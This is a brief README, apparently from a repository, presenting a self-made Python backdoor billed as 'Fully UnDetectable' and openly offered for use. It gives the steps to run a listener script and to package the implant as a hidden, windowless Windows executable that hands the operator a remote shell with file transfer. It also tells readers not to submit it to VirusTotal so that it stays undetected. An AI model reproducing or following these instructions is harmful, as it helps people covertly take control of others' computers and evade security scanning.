I created Fully UnDetectable (FUD) backdoor.
I wrote it myself from scratch in python.
Feel free to use it.

!!! But Never Ever try to upload it in virustotal.com !!!

There are two files, server.py and backdoor.py. server.py you need to keep on your machine and run it.

```python
python3 server.py
```
Convert backdoor.py into backdoor.exe. 
There are instractions.

```python
pip install pyinstaller
pip install --upgrade pyinstaller
pyinstaller backdoor.py --onefile --noconsole
```

Go into dist directory and run backdoor.exe file, and in your server.py you will get the shell.
You can use shell commands, upload your files, start videos, download files etc.
